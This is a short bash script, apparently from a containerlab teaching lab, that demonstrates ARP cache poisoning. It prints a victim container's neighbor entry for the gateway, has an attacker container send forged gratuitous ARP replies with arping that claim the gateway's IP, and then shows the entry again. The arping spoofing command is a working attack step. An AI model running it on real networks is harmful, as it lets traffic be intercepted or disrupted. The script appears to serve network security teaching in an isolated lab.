#!/usr/bin/env bash

set -euo pipefail

VICTIM="clab-lab10-victim01"
ATTACKER="clab-lab10-attacker01"

echo "=== Current gateway association ==="
docker exec "$VICTIM" ip neigh show 10.40.10.1

echo
echo "=== Sending controlled forged ARP advertisements ==="
docker exec "$ATTACKER" \
  arping -i eth1 -U -P -S 10.40.10.1 -c 5 10.40.10.10

sleep 1

echo
echo "=== Gateway association after ARP activity ==="
docker exec "$VICTIM" ip neigh show 10.40.10.1